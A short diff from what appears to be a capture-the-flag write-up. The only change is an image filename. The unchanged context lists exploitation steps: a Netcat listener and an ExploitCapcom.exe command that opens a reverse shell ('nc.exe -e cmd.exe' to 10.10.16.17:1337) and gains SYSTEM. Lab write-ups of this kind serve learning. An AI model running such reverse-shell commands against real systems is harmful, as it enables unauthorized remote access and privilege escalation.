@@ -351,7 +351,7 @@ Exploit
 5. Establish Netcat listener with `nc -lnvp 1337` on kali
 6. Execute reverse shell with `./ExploitCapcom.exe EXPLOIT "nc.exe -e cmd.exe 10.10.16.17 1337"`
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption><p>SYSTEM</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption><p>SYSTEM</p></figcaption></figure>
 
 ### Research
 
